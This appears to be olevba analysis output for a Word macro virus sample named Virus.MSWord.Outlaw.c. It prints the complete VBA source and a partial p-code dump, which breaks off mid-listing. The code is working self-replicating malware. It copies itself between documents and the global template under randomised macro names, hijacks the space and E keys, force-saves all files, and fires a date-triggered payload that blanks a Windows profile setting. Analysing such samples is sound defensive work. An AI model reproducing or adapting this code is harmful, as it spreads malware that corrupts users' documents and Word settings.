olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Outlaw.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Outlaw.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO BIDQHKJS.bas 
in file: Virus.MSWord.Outlaw.c - OLE stream: 'Macros/VBA/BIDQHKJS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim A$
Dim CO$
Dim OC$
Dim OCO$
Dim AK$
On Error GoTo -1: On Error GoTo Finish

A$ = WordBasic.[FileName$]()
If A$ = "" Then GoTo Finish

CO$ = WordBasic.[GetProfileString$]("Intl", "Info1")
OC$ = WordBasic.[GetProfileString$]("Intl", "Info2")
OCO$ = WordBasic.[GetProfileString$]("Intl", "Info3")

If VInstalled = 1 Then
    GoTo Finish
Else
    On Error Resume Next
    WordBasic.FileSaveAs Format:=1
    Run1
    Run2
    RunPayload
    WordBasic.FileSaveAll 1, 0
End If

Finish:
A$ = WordBasic.[FileName$]()
If A$ = "" Then
    GoTo Finito
Else
    WordBasic.Insert " "
End If

Finito:
If WordBasic.Month(WordBasic.Now()) = 9 And WordBasic.Day(WordBasic.Now()) = 4 Then
    GoTo Payload
Else
    GoTo No
End If

Payload:
AK$ = WordBasic.[GetProfileString$]("Intl", "Info3")
WordBasic.ToolsMacro Name:=AK$, Run:=1, Show:=0, Description:="", NewName:=""

No:
End Sub

Private Sub Run1()
Dim X$
Dim F$
Dim G$
Dim H$
Dim J$
Dim Y$
Dim Z$
Dim CO$
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

CO$ = WordBasic.[GetProfileString$]("Intl", "Info2")
WordBasic.MacroCopy "Global:" + CO$, WordBasic.[FileName$]() + ":" + Z$
WordBasic.SetDocumentVar "VirName", Z$
WordBasic.ToolsCustomizeKeyboard KeyCode:=32, Category:=2, Name:=Z$, Add:=1, Context:=1
End Sub

Private Sub Run2()
Dim X$
Dim F$
Dim G$
Dim H$
Dim J$
Dim Y$
Dim Z$
Dim OC$
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

OC$ = WordBasic.[GetProfileString$]("Intl", "Info1")
WordBasic.MacroCopy "Global:" + OC$, WordBasic.[FileName$]() + ":" + Z$
WordBasic.SetDocumentVar "VirNameDoc", Z$
WordBasic.ToolsCustomizeKeyboard KeyCode:=69, Category:=2, Name:=Z$, Add:=1, Context:=1
End Sub

Private Sub RunPayload()
Dim X$
Dim F$
Dim G$
Dim H$
Dim J$
Dim Y$
Dim Z$
Dim OCO$
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

OCO$ = WordBasic.[GetProfileString$]("Intl", "Info3")
WordBasic.MacroCopy "Global:" + OCO$, WordBasic.[FileName$]() + ":" + Z$
WordBasic.SetDocumentVar "VirNamePayload", Z$
End Sub

Private Function VInstalled()
Dim CC$
Dim i
On Error Resume Next
CC$ = WordBasic.[GetDocumentVar$]("VirNameDoc")
    VInstalled = 0
    If WordBasic.CountMacros(1) > 0 Then
        For i = 1 To WordBasic.CountMacros(1)
            If WordBasic.[MacroName$](i, 1) = CC$ Then
                VInstalled = 1
            End If
        Next i
    End If
End Function

Private Function Fun$(F$, G$, H$, J$)
Dim One
Dim Two
Dim Num
Dim A$
Dim B$
Dim C$
Dim D$
Dim E$
One = 1169
Two = 9294
Num = WordBasic.Int(Rnd() * (Two - One) + One)
A$ = Str(Num)
A$ = WordBasic.[LTrim$](A$)

B$ = Mid(A$, 1, 1)
C$ = Mid(A$, 2, 1)
D$ = Mid(A$, 3, 1)
E$ = Mid(A$, 4, 1)

If B$ = "1" Then F$ = "A"
If B$ = "2" Then F$ = "B"
If B$ = "3" Then F$ = "C"
If B$ = "4" Then F$ = "D"
If B$ = "5" Then F$ = "E"
If B$ = "6" Then F$ = "F"
If B$ = "7" Then F$ = "G"
If B$ = "8" Then F$ = "H"
If B$ = "9" Then F$ = "I"
If B$ = "0" Then F$ = "J"

If C$ = "1" Then G$ = "H"
If C$ = "2" Then G$ = "I"
If C$ = "3" Then G$ = "J"
If C$ = "4" Then G$ = "K"
If C$ = "5" Then G$ = "L"
If C$ = "6" Then G$ = "M"
If C$ = "7" Then G$ = "N"
If C$ = "8" Then G$ = "O"
If C$ = "9" Then G$ = "P"
If C$ = "0" Then G$ = "Q"

If D$ = "1" Then H$ = "A"
If D$ = "2" Then H$ = "B"
If D$ = "3" Then H$ = "C"
If D$ = "4" Then H$ = "D"
If D$ = "5" Then H$ = "E"
If D$ = "6" Then H$ = "F"
If D$ = "7" Then H$ = "G"
If D$ = "8" Then H$ = "H"
If D$ = "9" Then H$ = "I"
If D$ = "0" Then H$ = "J"

If E$ = "1" Then J$ = "R"
If E$ = "2" Then J$ = "S"
If E$ = "3" Then J$ = "T"
If E$ = "4" Then J$ = "U"
If E$ = "5" Then J$ = "V"
If E$ = "6" Then J$ = "W"
If E$ = "7" Then J$ = "X"
If E$ = "8" Then J$ = "Y"
If E$ = "9" Then J$ = "Z"
If E$ = "0" Then J$ = "Q"

Fun$ = F$ + G$ + H$ + J$
End Function
-------------------------------------------------------------------------------
VBA MACRO BIAWFPJU.bas 
in file: Virus.MSWord.Outlaw.c - OLE stream: 'Macros/VBA/BIAWFPJU'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim A$
On Error GoTo -1: On Error GoTo Done

A$ = WordBasic.[FileName$]()
If A$ = "" Then GoTo Finish

If VInstalled = 0 Then
    Run1
    Run2
    RunPayload
    WordBasic.FileSaveAll 1, 1
Else
    GoTo Done
End If

Done:
A$ = WordBasic.[FileName$]()
If A$ = "" Then
    GoTo Finish
Else
    WordBasic.Insert "e"
End If

Finish:
WordBasic.MsgBox "COE", -8
End Sub

Private Sub Run1()
Dim X$
Dim F$
Dim G$
Dim H$
Dim J$
Dim Y$
Dim Z$
Dim R1$
Dim CO$
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

R1$ = WordBasic.[GetDocumentVar$]("VirNameDoc")
CO$ = WordBasic.[FileName$]() + ":" + R1$
WordBasic.MacroCopy CO$, "Global:" + Z$
WordBasic.SetProfileString "Intl", "Info2", Z$
WordBasic.ToolsCustomizeKeyboard KeyCode:=32, Category:=2, Name:=Z$, Add:=1, Context:=0
End Sub

Private Sub Run2()
Dim X$
Dim F$
Dim G$
Dim H$
Dim J$
Dim Y$
Dim Z$
Dim R2$
Dim OC$
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

R2$ = WordBasic.[GetDocumentVar$]("VirName")
OC$ = WordBasic.[FileName$]() + ":" + R2$
WordBasic.MacroCopy OC$, "Global:" + Z$
WordBasic.SetProfileString "Intl", "Info1", Z$
WordBasic.ToolsCustomizeKeyboard KeyCode:=69, Category:=2, Name:=Z$, Add:=1, Context:=0
End Sub

Private Sub RunPayload()
Dim X$
Dim F$
Dim G$
Dim H$
Dim J$
Dim Y$
Dim Z$
Dim R3$
Dim OCO$
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

R3$ = WordBasic.[GetDocumentVar$]("VirNamePayload")
OCO$ = WordBasic.[FileName$]() + ":" + R3$
WordBasic.MacroCopy OCO$, "Global:" + Z$
WordBasic.SetProfileString "Intl", "Info3", Z$
End Sub

Private Function VInstalled()
Dim CC$
Dim i
CC$ = WordBasic.[GetProfileString$]("Intl", "Info1")
    VInstalled = 0
    If WordBasic.CountMacros(0) > 0 Then
        For i = 1 To WordBasic.CountMacros(0)
        If WordBasic.[MacroName$](i, 0) = CC$ Then
            VInstalled = 1
        End If
    Next i
End If
End Function

Private Function Fun$(F$, G$, H$, J$)
Dim One
Dim Two
Dim Num
Dim A$
Dim B$
Dim C$
Dim D$
Dim E$
One = 1169
Two = 9294
Num = WordBasic.Int(Rnd() * (Two - One) + One)
A$ = Str(Num)
A$ = WordBasic.[LTrim$](A$)

B$ = Mid(A$, 1, 1)
C$ = Mid(A$, 2, 1)
D$ = Mid(A$, 3, 1)
E$ = Mid(A$, 4, 1)

If B$ = "1" Then F$ = "A"
If B$ = "2" Then F$ = "B"
If B$ = "3" Then F$ = "C"
If B$ = "4" Then F$ = "D"
If B$ = "5" Then F$ = "E"
If B$ = "6" Then F$ = "F"
If B$ = "7" Then F$ = "G"
If B$ = "8" Then F$ = "H"
If B$ = "9" Then F$ = "I"
If B$ = "0" Then F$ = "J"

If C$ = "1" Then G$ = "H"
If C$ = "2" Then G$ = "I"
If C$ = "3" Then G$ = "J"
If C$ = "4" Then G$ = "K"
If C$ = "5" Then G$ = "L"
If C$ = "6" Then G$ = "M"
If C$ = "7" Then G$ = "N"
If C$ = "8" Then G$ = "O"
If C$ = "9" Then G$ = "P"
If C$ = "0" Then G$ = "Q"

If D$ = "1" Then H$ = "A"
If D$ = "2" Then H$ = "B"
If D$ = "3" Then H$ = "C"
If D$ = "4" Then H$ = "D"
If D$ = "5" Then H$ = "E"
If D$ = "6" Then H$ = "F"
If D$ = "7" Then H$ = "G"
If D$ = "8" Then H$ = "H"
If D$ = "9" Then H$ = "I"
If D$ = "0" Then H$ = "J"

If E$ = "1" Then J$ = "R"
If E$ = "2" Then J$ = "S"
If E$ = "3" Then J$ = "T"
If E$ = "4" Then J$ = "U"
If E$ = "5" Then J$ = "V"
If E$ = "6" Then J$ = "W"
If E$ = "7" Then J$ = "X"
If E$ = "8" Then J$ = "Y"
If E$ = "9" Then J$ = "Z"
If E$ = "0" Then J$ = "Q"

Fun$ = F$ + G$ + H$ + J$
End Function
-------------------------------------------------------------------------------
VBA MACRO AIHYFNFR.bas 
in file: Virus.MSWord.Outlaw.c - OLE stream: 'Macros/VBA/AIHYFNFR'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()

WordBasic.SetProfileString "windows", "Program", ""
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Outlaw.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/BIDQHKJS - 9195 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn A
' Line #3:
' 	Dim 
' 	VarDefn CO
' Line #4:
' 	Dim 
' 	VarDefn OC
' Line #5:
' 	Dim 
' 	VarDefn OCO
' Line #6:
' 	Dim 
' 	VarDefn AK
' Line #7:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Finish 
' Line #8:
' Line #9:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St A$ 
' Line #10:
' 	Ld A$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Finish 
' 	EndIf 
' Line #11:
' Line #12:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info1"
' 	Ld WordBasic 
' 	ArgsMemLd [GetProfileString$] 0x0002 
' 	St CO$ 
' Line #13:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info2"
' 	Ld WordBasic 
' 	ArgsMemLd [GetProfileString$] 0x0002 
' 	St OC$ 
' Line #14:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info3"
' 	Ld WordBasic 
' 	ArgsMemLd [GetProfileString$] 0x0002 
' 	St OCO$ 
' Line #15:
' Line #16:
' 	Ld VInstalled 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #17:
' 	GoTo Finish 
' Line #18:
' 	ElseBlock 
' Line #19:
' 	OnError (Resume Next) 
' Line #20:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #21:
' 	ArgsCall Run1 0x0000 
' Line #22:
' 	ArgsCall Run2 0x0000 
' Line #23:
' 	ArgsCall RunPayload 0x0000 
' Line #24:
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAll 0x0002 
' Line #25:
' 	EndIfBlock 
' Line #26:
' Line #27:
' 	Label Finish 
' Line #28:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St A$ 
' Line #29:
' 	Ld A$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #30:
' 	GoTo Finito 
' Line #31:
' 	ElseBlock 
' Line #32:
' 	LitStr 0x0001 " "
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #33:
' 	EndIfBlock 
' Line #34:
' Line #35:
' 	Label Finito 
' Line #36:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Month 0x0001 
' 	LitDI2 0x0009 
' 	Eq 
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x0004 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #37:
' 	GoTo Payload 
' Line #38:
' 	ElseBlock 
' Line #39:
' 	GoTo No 
' Line #40:
' 	EndIfBlock 
' Line #41:
' Line #42:
' 	Label Payload 
' Line #43:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info3"
' 	Ld WordBasic 
' 	ArgsMemLd [GetProfileString$] 0x0002 
' 	St AK$ 
' Line #44:
' 	Ld AK$ 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Run 
' 	LitDI2 0x0000 
' 	ParamNamed Show 
' 	LitStr 0x0000 ""
' 	ParamNamed Description 
' 	LitStr 0x0000 ""
' 	ParamNamed NewName 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsMacro 0x0005 
' Line #45:
' Line #46:
' 	Label No 
' Line #47:
' 	EndSub 
' Line #48:
' Line #49:
' 	FuncDefn (Private Sub Run1())
' Line #50:
' 	Dim 
' 	VarDefn X
' Line #51:
' 	Dim 
' 	VarDefn False
' Line #52:
' 	Dim 
' 	VarDefn G
' Line #53:
' 	Dim 
' 	VarDefn H
' Line #54:
' 	Dim 
' 	VarDefn J
' Line #55:
' 	Dim 
' 	VarDefn Y
' Line #56:
' 	Dim 
' 	VarDefn Z
' Line #57:
' 	Dim 
' 	VarDefn CO
' Line #58:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St X$ 
' Line #59:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St Y$ 
' Line #60:
' Line #61:
' 	Ld X$ 
' 	Ld Y$ 
' 	Add 
' 	St Z$ 
' Line #62:
' Line #63:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info2"
' 	Ld WordBasic 
' 	ArgsMemLd [GetProfileString$] 0x0002 
' 	St CO$ 
' Line #64:
' 	LitStr 0x0007 "Global:"
' 	Ld CO$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Z$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #65:
' 	LitStr 0x0007 "VirName"
' 	Ld Z$ 
' 	Ld WordBasic 
' 	ArgsMemCall SetDocumentVar 0x0002 
' Line #66:
' 	LitDI2 0x0020 
' 	ParamNamed KeyCode 
' 	LitDI2 0x0002 
' 	ParamNamed Category 
' 	Ld Z$ 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Add 
' 	LitDI2 0x0001 
' 	ParamNamed Context 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsCustomizeKeyboard 0x0005 
' Line #67:
' 	EndSub 
' Line #68:
' Line #69:
' 	FuncDefn (Private Sub Run2())
' Line #70:
' 	Dim 
' 	VarDefn X
' Line #71:
' 	Dim 
' 	VarDefn False
' Line #72:
' 	Dim 
' 	VarDefn G
' Line #73:
' 	Dim 
' 	VarDefn H
' Line #74:
' 	Dim 
' 	VarDefn J
' Line #75:
' 	Dim 
' 	VarDefn Y
' Line #76:
' 	Dim 
' 	VarDefn Z
' Line #77:
' 	Dim 
' 	VarDefn OC
' Line #78:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St X$ 
' Line #79:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St Y$ 
' Line #80:
' Line #81:
' 	Ld X$ 
' 	Ld Y$ 
' 	Add 
' 	St Z$ 
' Line #82:
' Line #83:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info1"
' 	Ld WordBasic 
' 	ArgsMemLd [GetProfileString$] 0x0002 
' 	St OC$ 
' Line #84:
' 	LitStr 0x0007 "Global:"
' 	Ld OC$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Z$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #85:
' 	LitStr 0x000A "VirNameDoc"
' 	Ld Z$ 
' 	Ld WordBasic 
' 	ArgsMemCall SetDocumentVar 0x0002 
' Line #86:
' 	LitDI2 0x0045 
' 	ParamNamed KeyCode 
' 	LitDI2 0x0002 
' 	ParamNamed Category 
' 	Ld Z$ 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Add 
' 	LitDI2 0x0001 
' 	ParamNamed Context 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsCustomizeKeyboard 0x0005 
' Line #87:
' 	EndSub 
' Line #88:
' Line #89:
' 	FuncDefn (Private Sub RunPayload())
' Line #90:
' 	Dim 
' 	VarDefn X
' Line #91:
' 	Dim 
' 	VarDefn False
' Line #92:
' 	Dim 
' 	VarDefn G
' Line #93:
' 	Dim 
' 	VarDefn H
' Line #94:
' 	Dim 
' 	VarDefn J
' Line #95:
' 	Dim 
' 	VarDefn Y
' Line #96:
' 	Dim 
' 	VarDefn Z
' Line #97:
' 	Dim 
' 	VarDefn OCO
' Line #98:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St X$ 
' Line #99:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St Y$ 
' Line #100:
' Line #101:
' 	Ld X$ 
' 	Ld Y$ 
' 	Add 
' 	St Z$ 
' Line #102:
' Line #103:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info3"
' 	Ld WordBasic 
' 	ArgsMemLd [GetProfileString$] 0x0002 
' 	St OCO$ 
' Line #104:
' 	LitStr 0x0007 "Global:"
' 	Ld OCO$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Z$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #105:
' 	LitStr 0x000E "VirNamePayload"
' 	Ld Z$ 
' 	Ld WordBasic 
' 	ArgsMemCall SetDocumentVar 0x0002 
' Line #106:
' 	EndSub 
' Line #107:
' Line #108:
' 	FuncDefn (Private Function VInstalled())
' Line #109:
' 	Dim 
' 	VarDefn CC
' Line #110:
' 	Dim 
' 	VarDefn i
' Line #111:
' 	OnError (Resume Next) 
' Line #112:
' 	LitStr 0x000A "VirNameDoc"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	St CC$ 
' Line #113:
' 	LitDI2 0x0000 
' 	St VInstalled 
' Line #114:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #115:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	For 
' Line #116:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	Ld CC$ 
' 	Eq 
' 	IfBlock 
' Line #117:
' 	LitDI2 0x0001 
' 	St VInstalled 
' Line #118:
' 	EndIfBlock 
' Line #119:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #120:
' 	EndIfBlock 
' Line #121:
' 	EndFunc 
' Line #122:
' Line #123:
' 	FuncDefn (Private Function Fun(False, G, H, J))
' Line #124:
' 	Dim 
' 	VarDefn One
' Line #125:
' 	Dim 
' 	VarDefn Two
' Line #126:
' 	Dim 
' 	VarDefn Num
' Line #127:
' 	Dim 
' 	VarDefn A
' Line #128:
' 	Dim 
' 	VarDefn B
' Line #129:
' 	Dim 
' 	VarDefn C
' Line #130:
' 	Dim 
' 	VarDefn D
' Line #131:
' 	Dim 
' 	VarDefn E
' Line #132:
' 	LitDI2 0x0491 
' 	St One 
' Line #133:
' 	LitDI2 0x244E 
' 	St Two 
' Line #134:
' 	ArgsLd Rnd 0x0000 
' 	Ld Two 
' 	Ld One 
' 	Sub 
' 	Paren 
' 	Mul 
' 	Ld One 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	St Num 
' Line #135:
' 	Ld Num 
' 	ArgsLd Str 0x0001 
' 	St A$ 
' Line #136:
' 	Ld A$ 
' 	Ld WordBasic 
' 	ArgsMemLd [LTrim$] 0x0001 
' 	St A$ 
' Line #137:
' Line #138:
' 	Ld A$ 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St B$ 
' Line #139:
' 	Ld A$ 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St C$ 
' Line #140:
' 	Ld A$ 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St D$ 
' Line #141:
' 	Ld A$ 
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St E$ 
' Line #142:
' Line #143:
' 	Ld B$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St False$ 
' 	EndIf 
' Line #144:
' 	Ld B$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St False$ 
' 	EndIf 
' Line #145:
' 	Ld B$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St False$ 
' 	EndIf 
' Line #146:
' 	Ld B$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St False$ 
' 	EndIf 
' Line #147:
' 	Ld B$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St False$ 
' 	EndIf 
' Line #148:
' 	Ld B$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St False$ 
' 	EndIf 
' Line #149:
' 	Ld B$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St False$ 
' 	EndIf 
' Line #150:
' 	Ld B$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St False$ 
' 	EndIf 
' Line #151:
' 	Ld B$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St False$ 
' 	EndIf 
' Line #152:
' 	Ld B$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St False$ 
' 	EndIf 
' Line #153:
' Line #154:
' 	Ld C$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St G$ 
' 	EndIf 
' Line #155:
' 	Ld C$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St G$ 
' 	EndIf 
' Line #156:
' 	Ld C$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St G$ 
' 	EndIf 
' Line #157:
' 	Ld C$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St G$ 
' 	EndIf 
' Line #158:
' 	Ld C$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St G$ 
' 	EndIf 
' Line #159:
' 	Ld C$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St G$ 
' 	EndIf 
' Line #160:
' 	Ld C$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St G$ 
' 	EndIf 
' Line #161:
' 	Ld C$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St G$ 
' 	EndIf 
' Line #162:
' 	Ld C$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St G$ 
' 	EndIf 
' Line #163:
' 	Ld C$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St G$ 
' 	EndIf 
' Line #164:
' Line #165:
' 	Ld D$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St H$ 
' 	EndIf 
' Line #166:
' 	Ld D$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St H$ 
' 	EndIf 
' Line #167:
' 	Ld D$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St H$ 
' 	EndIf 
' Line #168:
' 	Ld D$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St H$ 
' 	EndIf 
' Line #169:
' 	Ld D$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St H$ 
' 	EndIf 
' Line #170:
' 	Ld D$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St H$ 
' 	EndIf 
' Line #171:
' 	Ld D$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St H$ 
' 	EndIf 
' Line #172:
' 	Ld D$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St H$ 
' 	EndIf 
' Line #173:
' 	Ld D$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St H$ 
' 	EndIf 
' Line #174:
' 	Ld D$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St H$ 
' 	EndIf 
' Line #175:
' Line #176:
' 	Ld E$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St J$ 
' 	EndIf 
' Line #177:
' 	Ld E$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St J$ 
' 	EndIf 
' Line #178:
' 	Ld E$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St J$ 
' 	EndIf 
' Line #179:
' 	Ld E$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St J$ 
' 	EndIf 
' Line #180:
' 	Ld E$ 
' 	LitStr 0x0001 "5"
' 	Eq 
